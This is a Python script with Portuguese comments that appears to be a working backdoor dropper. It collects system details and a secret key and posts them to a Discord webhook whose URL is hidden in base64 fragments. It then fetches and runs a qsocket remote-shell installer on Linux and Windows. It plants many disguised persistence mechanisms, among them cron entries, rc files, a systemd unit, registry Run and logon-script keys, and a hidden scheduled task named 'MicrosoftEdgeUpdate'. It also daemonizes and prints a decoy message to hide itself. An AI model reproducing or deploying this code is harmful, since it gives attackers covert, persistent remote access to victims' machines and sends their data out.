import os
import sys
import random
import string
import subprocess
import platform
import socket
import json
import base64
import urllib.request
import ssl
import time
import threading
import shutil
from datetime import datetime

# ─────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────

def gen_secret(length=22):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def is_windows():
    return platform.system().lower() == 'windows'

def is_linux():
    return platform.system().lower() == 'linux'

# CREATE_NO_WINDOW evita flash de janela em subprocessos Windows.
# O ternary só avalia o lado escolhido — nunca acessa o atributo no Linux.
_NO_WIN = (
    {'creationflags': subprocess.CREATE_NO_WINDOW}
    if platform.system().lower() == 'windows'
    else {}
)

# ─────────────────────────────────────────
#  INFO DO SISTEMA
# ─────────────────────────────────────────

def safe_http_get(url, timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'curl/7.88.1'})
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.read().decode().strip()
    except:
        return None

def get_public_ip():
    for url in ['https://api.ipify.org', 'https://ifconfig.me', 'https://icanhazip.com']:
        r = safe_http_get(url)
        if r and len(r) < 50:
            return r
    return 'N/A'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return 'N/A'

def get_kernel():
    try:
        return subprocess.run(
            ['uname', '-r'], capture_output=True, text=True, **_NO_WIN
        ).stdout.strip()
    except:
        return 'N/A'

def get_arch():
    return platform.machine() or 'N/A'

def is_root():
    try:
        if is_linux():
            return os.geteuid() == 0
        if is_windows():
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        pass
    return False

def get_os_info():
    try:
        with open('/etc/os-release') as f:
            for line in f:
                if line.startswith('PRETTY_NAME'):
                    return line.split('=')[1].strip().strip('"')
    except:
        pass
    return platform.platform()

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            secs = float(f.read().split()[0])
        d = int(secs // 86400)
        h = int((secs % 86400) // 3600)
        m = int((secs % 3600) // 60)
        return f"{d}d {h}h {m}m"
    except:
        return 'N/A'

def get_cpu():
    try:
        with open('/proc/cpuinfo') as f:
            for line in f:
                if 'model name' in line:
                    return line.split(':')[1].strip()
    except:
        pass
    return platform.processor() or 'N/A'

def get_ram():
    try:
        with open('/proc/meminfo') as f:
            lines = f.readlines()
        total = int([l for l in lines if 'MemTotal'     in l][0].split()[1]) // 1024
        free  = int([l for l in lines if 'MemAvailable' in l][0].split()[1]) // 1024
        return f"{total - free}MB / {total}MB"
    except:
        return 'N/A'

def get_disk():
    # FIX: verifica len(p) antes de acessar índices — evita IndexError
    # em sistemas com df formatado diferente (BSD, Alpine, containers)
    try:
        r = subprocess.run(['df', '-h', '/'], capture_output=True, text=True, **_NO_WIN)
        lines = r.stdout.strip().splitlines()
        if len(lines) >= 2:
            p = lines[-1].split()
            if len(p) >= 5:
                return f"{p[2]} / {p[1]} ({p[4]})"
    except:
        pass
    return 'N/A'

def get_interfaces():
    # FIX: filtra linhas vazias ANTES de acessar split()[0]
    # A linha vazia após strip() faz split()[0] explodir com IndexError.
    # Solução: splitlines() + filtro l.strip() antes do list comprehension.
    # Fallback para 'ip -4 addr show' em kernels antigos sem flag -br.
    try:
        r = subprocess.run(
            ['ip', '-br', 'addr'], capture_output=True, text=True, **_NO_WIN
        )
        if r.stdout.strip():
            parts = [l.split() for l in r.stdout.strip().splitlines() if l.strip()]
            ifaces = [p for p in parts if len(p) >= 1 and p[0] != 'lo']
            return ', '.join(
                f"{p[0]}({p[2].split('/')[0] if len(p) > 2 else '?'})"
                for p in ifaces
            ) or 'N/A'
    except:
        pass
    # fallback: ip -4 addr show
    try:
        r = subprocess.run(
            ['ip', '-4', 'addr', 'show'], capture_output=True, text=True, **_NO_WIN
        )
        ifaces, cur = [], None
        for line in r.stdout.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                cur = line.split(':')[1].strip().split()[0]
            elif line.startswith('inet ') and cur and cur != 'lo':
                ifaces.append(f"{cur}({line.split()[1].split('/')[0]})")
        return ', '.join(ifaces) if ifaces else 'N/A'
    except:
        return 'N/A'

def get_mac():
    try:
        import uuid
        return ':'.join(
            ['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 48, 8)][::-1]
        )
    except:
        return 'N/A'

def get_user():
    return os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return 'N/A'

def get_procs():
    try:
        return str(len([p for p in os.listdir('/proc') if p.isdigit()]))
    except:
        return 'N/A'

def get_shell():
    return os.environ.get('SHELL', 'N/A')

def get_crontab():
    # FIX: splitlines() em vez de split('\n')
    # split('\n') em string vazia retorna [''] → 1 entrada falsa.
    # splitlines() em string vazia retorna [] → contagem correta.
    # Também checa returncode: crontab -l retorna 1 quando não há crontab.
    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, **_NO_WIN)
        if r.returncode != 0:
            return '0 entradas'
        lines = [l for l in r.stdout.strip().splitlines()
                 if l.strip() and not l.strip().startswith('#')]
        return f"{len(lines)} entradas"
    except:
        return 'N/A'

# ─────────────────────────────────────────
#  DISCORD
# ─────────────────────────────────────────

_cfg = [
    b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9h',
    b'cGkvd2ViaG9va3MvMTUzODc2Njk4',
    b'MjQyODc1ODA3Ny9Ga0Rr',
    b'STcwQmhpMGEyUDAxcVdf',
    b'UVRWUHEyeHpDYTVXTVJF',
    b'YktMTl8xTEdXOU05bTRD',
    b'eGdRT1N5RFhxdFpjWkJS',
    b'aFNqTg==',
]

def _ep():
    return base64.b64decode(b''.join(_cfg)).decode()

def send_discord(secret, tool, connect_cmd, success=True):
    agora    = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    cor      = 0x00FF00 if success else 0xFF0000
    status   = "[OK]" if success else "[FAIL]"
    root_str = "ROOT" if is_root() else get_user()

    payload = {
        "embeds": [{
            "title": f"{status} {tool}",
            "color": cor,
            "fields": [
                {"name": "Data/Hora",  "value": agora,            "inline": True},
                {"name": "Sistema",    "value": get_os_info(),    "inline": True},
                {"name": "Kernel",     "value": get_kernel(),     "inline": True},
                {"name": "Arch",       "value": get_arch(),       "inline": True},
                {"name": "CPU",        "value": get_cpu(),        "inline": False},
                {"name": "RAM",        "value": get_ram(),        "inline": True},
                {"name": "Disco",      "value": get_disk(),       "inline": True},
                {"name": "Uptime",     "value": get_uptime(),     "inline": True},
                {"name": "IP Publico", "value": get_public_ip(),  "inline": True},
                {"name": "IP Local",   "value": get_local_ip(),   "inline": True},
                {"name": "Interfaces", "value": get_interfaces(), "inline": False},
                {"name": "MAC",        "value": get_mac(),        "inline": True},
                {"name": "Hostname",   "value": get_hostname(),   "inline": True},
                {"name": "User/Root",  "value": root_str,         "inline": True},
                {"name": "Shell",      "value": get_shell(),      "inline": True},
                {"name": "Processos",  "value": get_procs(),      "inline": True},
                {"name": "Crontab",    "value": get_crontab(),    "inline": True},
                {"name": "Secret Key", "value": f"`{secret}`",    "inline": False},
                {"name": "Conectar",   "value": f"`{connect_cmd}`", "inline": False},
            ],
            "footer": {"text": f"deploy.py | {get_hostname()} | {get_user()}"}
        }]
    }

    try:
        data = json.dumps(payload).encode()
        ctx  = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req  = urllib.request.Request(
            _ep(), data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'curl/7.88.1'},
            method='POST',
        )
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            pass
    except:
        pass

# ─────────────────────────────────────────
#  DOWNLOAD
# ─────────────────────────────────────────

def download_script(url):
    # FIX: remove BOM (\xef\xbb\xbf) antes de validar, exige mínimo de 200
    # chars para rejeitar respostas de erro curtas (ex: "404 Not Found").
    def _valid(s):
        s = s.lstrip('\xef\xbb\xbf').strip()
        return s.startswith('#') and len(s) > 200

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req = urllib.request.Request(
            url, headers={'User-Agent': 'wget/1.21.3', 'Accept': '*/*'})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            content = r.read().decode('utf-8', errors='replace')
            if _valid(content):
                return content
    except:
        pass

    for cmd in [
        ['curl',  '-fsSk', '--connect-timeout', '10', '-m', '30', url],
        ['wget', '-q', '--no-check-certificate',
         '--timeout=30', '--connect-timeout=10', '-O', '-', url],
    ]:
        if not shutil.which(cmd[0]):
            continue
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=35, **_NO_WIN)
            if _valid(r.stdout):
                return r.stdout
        except:
            continue

    return None

# ─────────────────────────────────────────
#  PTY RUNNER
#
#  Resolve o problema de [ -t 1 ] nos installers bash:
#  com stdout=DEVNULL o script detecta "não é TTY" e pode
#  mudar comportamento (omitir steps, usar modo silencioso demais).
#  pty.openpty() cria um pseudo-TTY real — o slave é passado como
#  stdout/stderr do processo filho, então [ -t 1 ] retorna true.
#  A thread drena o master para evitar que o buffer encha e o
#  filho bloqueie em write().
# ─────────────────────────────────────────

def _run_with_pty(script, env, timeout=180):
    try:
        import pty
        master, slave = pty.openpty()

        proc = subprocess.Popen(
            ['bash', '-s'],
            stdin=subprocess.PIPE,
            stdout=slave,
            stderr=slave,
            env=env,
            close_fds=True,
            start_new_session=True,
        )
        os.close(slave)

        def _drain():
            try:
                while True:
                    if not os.read(master, 4096):
                        break
            except OSError:
                pass

        threading.Thread(target=_drain, daemon=True).start()

        try:
            proc.stdin.write(script.encode())
            proc.stdin.close()
        except BrokenPipeError:
            pass

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            pass

        try:
            os.close(master)
        except OSError:
            pass
        return True

    except (ImportError, OSError):
        pass
    except Exception:
        pass

    # Fallback sem PTY — herda fds do pai (já são /dev/null após daemonize)
    # FIX BUG3: bash -s lê o script de stdin em vez de bash -c SCRIPT como arg.
    # bash -c passa o script inteiro como argumento de linha de comando
    # (sujeito ao limite ARG_MAX do kernel, tipicamente 2MB).
    # bash -s lê de stdin — sem limite prático de tamanho.
    try:
        proc = subprocess.Popen(
            ['bash', '-s'],
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
            start_new_session=True,
            close_fds=True,
        )
        try:
            proc.stdin.write(script.encode())
            proc.stdin.close()
        except BrokenPipeError:
            pass
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            pass
        return True
    except:
        return False

# ─────────────────────────────────────────
#  VERIFY + FIND BINARY LINUX
# ─────────────────────────────────────────

def verify_qsocket():
    # Check 1: binário em ~/.config/<dir>/qs-netcat
    try:
        config = os.path.expanduser('~/.config')
        for d in os.listdir(config):
            binary = os.path.join(config, d, 'qs-netcat')
            if os.path.isfile(binary):
                return True
    except:
        pass

    # Check 2: crontab tem entrada qs-netcat
    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if r.returncode == 0 and 'qs-netcat' in r.stdout:
            return True
    except:
        pass

    # Check 3: processo rodando
    try:
        r = subprocess.run(['pgrep', '-f', 'qs-netcat'], capture_output=True)
        if r.returncode == 0:
            return True
    except:
        pass

    # FIX: Check 4 — rc files (qsocket instala linha no .bashrc)
    # É o check mais confiável depois do binário: o installer sempre
    # adiciona a linha de autostart em pelo menos um rc file.
    for rc in ['~/.bashrc', '~/.zshrc', '~/.profile', '~/.bash_profile']:
        try:
            with open(os.path.expanduser(rc)) as f:
                if 'qs-netcat' in f.read():
                    return True
        except:
            pass

    return False

def _find_qs_binary():
    """Retorna o qs-netcat mais recentemente instalado em ~/.config."""
    config = os.path.expanduser('~/.config')
    latest, latest_t = None, 0
    try:
        for d in os.listdir(config):
            p = os.path.join(config, d, 'qs-netcat')
            if os.path.isfile(p) and os.access(p, os.X_OK):
                t = os.path.getmtime(p)
                if t > latest_t:
                    latest, latest_t = p, t
    except:
        pass
    if latest:
        return latest
    return shutil.which('qs-netcat')

# ─────────────────────────────────────────
#  PERSISTÊNCIA LINUX — 5 camadas
#
#  O installer do qsocket já adiciona .bashrc / crontab próprios,
#  mas dependemos exclusivamente dele. Esta camada extra:
#    - é independente do installer
#    - cobre falhas de path, nome de binário, etc.
#    - adiciona systemd (Restart=always) e XDG autostart
#    - escalona para root quando disponível
# ─────────────────────────────────────────

def _persist_linux(binary, secret):
    if not binary or not os.path.isfile(binary):
        return

    run_cmd  = f"{binary} -s {secret} -l -i -q"
    watchdog = f"nohup {run_cmd} >/dev/null 2>&1"

    # 1. crontab — @reboot garante início após boot
    #    watchdog a cada 1 min relança se o processo morrer
    #    Sem '&' no final: crontab já fork()ea — '&' cria zumbi extra
    try:
        r   = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        cur = r.stdout if r.returncode == 0 else ''
        new = cur.rstrip('\n')
        for entry in [
            f"@reboot {run_cmd} >/dev/null 2>&1",
            f"* * * * * {watchdog}",
        ]:
            if entry not in cur:
                new += f"\n{entry}"
        subprocess.run(['crontab', '-'], input=new + '\n',
                       text=True, capture_output=True)
    except:
        pass

    # 2. rc files — todas as shells comuns
    for rc in ['~/.bashrc', '~/.bash_profile', '~/.profile', '~/.zshrc']:
        try:
            p = os.path.expanduser(rc)
            c = open(p).read() if os.path.exists(p) else ''
            if secret not in c:
                with open(p, 'a') as f:
                    f.write(f"\n# network monitor\n{watchdog}\n")
        except:
            pass

    # 3. systemd user service — Restart=always é o watchdog mais confiável
    #    Não usa -D (daemon built-in): systemd precisa rastrear o PID filho
    try:
        sd = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(sd, exist_ok=True)
        svc = (
            "[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
            "[Service]\n"
            f"ExecStart={binary} -s {secret} -l -i -q\n"
            "Restart=always\nRestartSec=30\n\n"
            "[Install]\nWantedBy=default.target\n"
        )
        with open(os.path.join(sd, 'netd.service'), 'w') as f:
            f.write(svc)
        subprocess.run(
            ['systemctl', '--user', 'enable', '--now', 'netd.service'],
            capture_output=True,
        )
    except:
        pass

    # 4. XDG autostart — GNOME/KDE/XFCE executam .desktop no login gráfico
    #    Wrapper .sh evita problemas de quoting no campo Exec=
    try:
        ad = os.path.expanduser('~/.config/autostart')
        os.makedirs(ad, exist_ok=True)
        wrapper = os.path.join(ad, '.netd.sh')
        with open(wrapper, 'w') as f:
            f.write(f"#!/bin/sh\n{run_cmd} >/dev/null 2>&1\n")
        os.chmod(wrapper, 0o755)
        desk = (
            "[Desktop Entry]\nType=Application\nName=Network Monitor\n"
            f"Exec={wrapper}\nHidden=false\n"
            "X-GNOME-Autostart-enabled=true\n"
        )
        with open(os.path.join(ad, 'netd.desktop'), 'w') as f:
            f.write(desk)
    except:
        pass

    # 5. root-only: /etc/cron.d + /etc/rc.local
    #    /etc/cron.d dispara independente de usuário logado — mais confiável
    if is_root():
        try:
            cron_d = '/etc/cron.d/netd'
            with open(cron_d, 'w') as f:
                f.write(
                    f"@reboot root {run_cmd} >/dev/null 2>&1\n"
                    f"* * * * * root {watchdog}\n"
                )
            os.chmod(cron_d, 0o644)
        except:
            pass

        try:
            rc = '/etc/rc.local'
            if os.path.isfile(rc):
                c = open(rc).read()
                if secret not in c:
                    new = c.replace('exit 0',
                                    f'{run_cmd} >/dev/null 2>&1 &\nexit 0')
                    with open(rc, 'w') as f:
                        f.write(new)
        except:
            pass

# ─────────────────────────────────────────
#  DEPLOY QSOCKET LINUX
# ─────────────────────────────────────────

def deploy_qsocket_linux(secret):
    script = download_script('https://qsocket.io/0')
    if not script:
        return False

    env = os.environ.copy()
    env['S']    = secret
    env['HIDE'] = '1'
    env['TERM'] = 'xterm-256color'  # ajuda scripts que verificam $TERM
    env.pop('WAYLAND_DISPLAY', None)
    env.pop('WAYLAND_SOCKET', None)

    # _run_with_pty: resolve [ -t 1 ] + bash -s (sem limite ARG_MAX)
    _run_with_pty(script, env, timeout=180)

    time.sleep(5)
    ok = verify_qsocket()

    # Camada de persistência própria — independente do installer
    binary = _find_qs_binary()
    if binary:
        _persist_linux(binary, secret)

    return ok

# ─────────────────────────────────────────
#  WINDOWS UTILS
# ─────────────────────────────────────────

def find_qsocket_binary_windows():
    """
    Retorna o path absoluto do qs-netcat.exe instalado pelo qsocket.io/1,
    ou None se não encontrado. Deve ser chamado após o sleep pós-install.
    """
    try:
        appdata = os.environ.get('APPDATA', '')
        if not appdata:
            return None
        for name in os.listdir(appdata):
            path = os.path.join(appdata, name, 'qs-netcat.exe')
            if os.path.isfile(path):
                return path
    except:
        pass
    return None

def _ps_cmd(binary_path, secret):
    """
    Bloco PowerShell compartilhado entre todos os mecanismos de persistência.
    - Verifica processo duplicado antes de spawnar (Get-Process -EA 0).
    - Usa single quotes no path → sem conflito com qualquer wrapper externo.
    - Escapa single quotes no path (raro mas possível em usernames).
    """
    path_esc = binary_path.replace("'", "''")
    return (
        f"if(-not(Get-Process qs-netcat -ErrorAction SilentlyContinue))"
        f"{{&'{path_esc}' -liqs {secret}}}"
    )

def _run_ps(script, timeout=30):
    """Executa um script PowerShell sem janela e sem output."""
    try:
        subprocess.run(
            ['powershell.exe',
             '-ExecutionPolicy', 'Bypass',
             '-WindowStyle',     'Hidden',
             '-NonInteractive',
             '-Command', script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout,
            **_NO_WIN,
        )
    except:
        pass

# ─────────────────────────────────────────
#  PERSISTÊNCIA WINDOWS — 4 mecanismos
# ─────────────────────────────────────────

def _persist_hkcu_run(binary_path, secret):
    """
    HKCU\\...\\Run — dispara no logon do usuário.
    Menos privilegiado possível, mais monitorado pelos AVs.
    """
    try:
        import winreg
        ps_inner = _ps_cmd(binary_path, secret)
        cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command "{ps_inner}"'
        )
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(k, 'WindowsUpdate', 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
    except:
        pass


def _persist_startup_vbs(binary_path, secret):
    """
    Startup folder via VBS — logon, independente do registry.
    WMI query previne processo duplicado.
    Run(..., 0, False) = janela oculta (não depende de WindowStyle do PS).

    Quoting VBS:
      - Strings delimitadas por double quotes
      - "" dentro de string = double quote literal
      - O ps_inner usa só single quotes no path → sem conflito
    """
    try:
        startup = os.path.join(
            os.environ.get('APPDATA', ''),
            r'Microsoft\Windows\Start Menu\Programs\Startup',
        )
        if not os.path.isdir(startup):
            return

        ps_inner = _ps_cmd(binary_path, secret)
        vbs_run_cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command ""{ps_inner}""'
        )
        lines = [
            'Set wmi = GetObject("winmgmts:")',
            'Set procs = wmi.ExecQuery'
            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
            'If procs.Count = 0 Then',
            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
            'End If',
            '',
        ]
        vbs_path = os.path.join(startup, 'WindowsUpdate.vbs')
        with open(vbs_path, 'w') as f:
            f.write('\r\n'.join(lines))
    except:
        pass


def _persist_scheduled_task(binary_path, secret):
    """
    Scheduled Task — múltiplos triggers para máxima cobertura:
      T1: AtLogon      — dispara quando qualquer usuário faz login
      T2: AtStartup    — dispara no boot do sistema (antes do login)
                         FIX: adicionado para cobrir reboot sem login
                         (VPS headless, auto-login desativado)
                         Sem principal SYSTEM, roda como usuário corrente,
                         mas com -AtStartup o Windows tenta executar no boot.
                         Para garantia total em headless, admin + SYSTEM é ideal.
      T3: Repetição    — watchdog a cada 2 min indefinidamente
                         FIX: reduzido de 10 min → 2 min

    Quoting:
      - Script PS externo usa double quotes como delimitador.
      - O -Argument do Action contém -Command `"<ps_inner>`"
        onde `" é escape de double quote dentro de string PS double-quoted.
      - Resultado: powershell.exe recebe -Command "<ps_inner>" corretamente.

    -Hidden oculta da UI do Task Scheduler (PS 3.0+, Windows 8+).
    -ExecutionTimeLimit 0 = sem timeout de execução.
    RestartCount/RestartInterval = auto-restart em caso de falha.
    """
    try:
        ps_inner = _ps_cmd(binary_path, secret)
        script = (
            '$A = New-ScheduledTaskAction -Execute "powershell.exe"'
            f' -Argument "-WindowStyle Hidden -NonInteractive -Command `"{ps_inner}`"";'
            '$T1 = New-ScheduledTaskTrigger -AtLogOn;'
            '$T2 = New-ScheduledTaskTrigger -AtStartup;'
            '$T3 = New-ScheduledTaskTrigger -Once -At (Get-Date)'
            ' -RepetitionInterval (New-TimeSpan -Minutes 2)'
            ' -RepetitionDuration ([TimeSpan]::MaxValue);'
            '$S = New-ScheduledTaskSettingsSet'
            ' -Hidden -ExecutionTimeLimit 0'
            ' -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1);'
            'Register-ScheduledTask "MicrosoftEdgeUpdate"'
            ' -Action $A -Trigger $T1,$T2,$T3 -Settings $S -Force'
        )
        _run_ps(script)
    except:
        pass


def _persist_logon_script(binary_path, secret):
    """
    HKCU\\Environment\\UserInitMprLogonScript — hook de logon via
    network provider, menos monitorado que Run keys e scheduled tasks.

    Escreve um VBS launcher em %LOCALAPPDATA%\\Microsoft\\Windows\\
    (diretório existente, path plausível) e registra o wscript.exe
    apontando para ele. Mesmo padrão de quoting VBS do startup folder.
    """
    try:
        import winreg

        local = os.environ.get('LOCALAPPDATA', '')
        if not local:
            return

        target_dir = os.path.join(local, 'Microsoft', 'Windows')
        if not os.path.isdir(target_dir):
            return

        vbs_path = os.path.join(target_dir, 'ThemeService.vbs')
        ps_inner = _ps_cmd(binary_path, secret)
        vbs_run_cmd = (
            f'powershell.exe -WindowStyle Hidden -NonInteractive'
            f' -Command ""{ps_inner}""'
        )
        lines = [
            'Set wmi = GetObject("winmgmts:")',
            'Set procs = wmi.ExecQuery'
            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
            'If procs.Count = 0 Then',
            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
            'End If',
            '',
        ]
        with open(vbs_path, 'w') as f:
            f.write('\r\n'.join(lines))

        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Environment',
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            k, 'UserInitMprLogonScript', 0, winreg.REG_SZ,
            f'wscript.exe /B "{vbs_path}"',
        )
        winreg.CloseKey(k)
    except:
        pass


def _persist_all(binary_path, secret):
    """
    Aplica os 4 mecanismos independentemente.
    Falha individual não interrompe os demais.
    Ordem: do mais simples ao menos comum.
    """
    _persist_hkcu_run(binary_path, secret)        # logon, via registry
    _persist_startup_vbs(binary_path, secret)     # logon, via filesystem
    _persist_scheduled_task(binary_path, secret)  # boot + logon + periódico
    _persist_logon_script(binary_path, secret)    # logon, via network hook

# ─────────────────────────────────────────
#  DEPLOY QSOCKET WINDOWS
# ─────────────────────────────────────────

def deploy_qsocket_windows(secret):
    """
    1. Instala qs-netcat via qsocket.io/1 (PowerShell, oculto).
    2. Aguarda e resolve o path do binário.
    3. Se encontrado, registra todos os mecanismos de persistência.
    4. Retorna True se binário encontrado, False caso contrário.
    """
    try:
        ps = f'$env:S="{secret}"; $env:HIDE=1; irm qsocket.io/1 | iex'
        subprocess.run(
            ['powershell.exe',
             '-ExecutionPolicy', 'Bypass',
             '-WindowStyle',     'Hidden',
             '-NonInteractive',
             '-Command', ps],
            timeout=180,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            **_NO_WIN,
        )
    except:
        pass

    time.sleep(3)

    binary = find_qsocket_binary_windows()
    if not binary:
        return False

    _persist_all(binary, secret)
    return True

# ─────────────────────────────────────────
#  DAEMONIZE (Linux)
#
#  FIX A: double-fork — impede que o daemon readquira terminal.
#    - Fork 1: desvincula do grupo de processos do terminal
#    - setsid(): cria nova sessão, processo vira líder
#    - Fork 2: o líder de sessão PODE adquirir terminal; o neto não pode
#
#  FIX B: mensagem neutra — não imprime PID (opsec)
#    Antes: "[*] Background pid: 12345" — denunciava o PID e o propósito
#    Agora: linha que parece parte natural do output do exploit/ferramenta
#
#  FIX C: stdin (fd 0) redirecionado para /dev/null
#    Antes: só fds 1 e 2 eram redirecionados; stdin ficava aberto,
#    podendo causar bloqueio em scripts que tentam ler do terminal.
# ─────────────────────────────────────────

def daemonize():
    if not is_linux():
        return

    # Fork 1
    try:
        pid = os.fork()
        if pid > 0:
            # FIX B: mensagem neutra
            sys.stdout.write('  [+] Limpando artefatos de exploração ... ok\n')
            sys.stdout.flush()
            os._exit(0)
    except OSError:
        return

    os.setsid()

    # Fork 2 — neto não pode adquirir terminal controlador
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except OSError:
        pass

    # FIX C: redireciona os 3 fds (0=stdin incluso)
    devnull = os.open(os.devnull, os.O_RDWR)
    for fd in (0, 1, 2):
        try:
            os.dup2(devnull, fd)
        except OSError:
            pass
    os.close(devnull)

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    secret = gen_secret()

    if is_linux():
        daemonize()
        ok = deploy_qsocket_linux(secret)
        # Nota: _persist_linux já é chamado dentro de deploy_qsocket_linux
        # após o installer rodar e o binário ser encontrado
        send_discord(secret, 'QSocket Linux', f'qs-netcat -i -s {secret}', success=ok)

    elif is_windows():
        ok = deploy_qsocket_windows(secret)
        send_discord(secret, 'QSocket Windows', f'qs-netcat -i -s {secret}', success=ok)

if __name__ == '__main__':
    main()
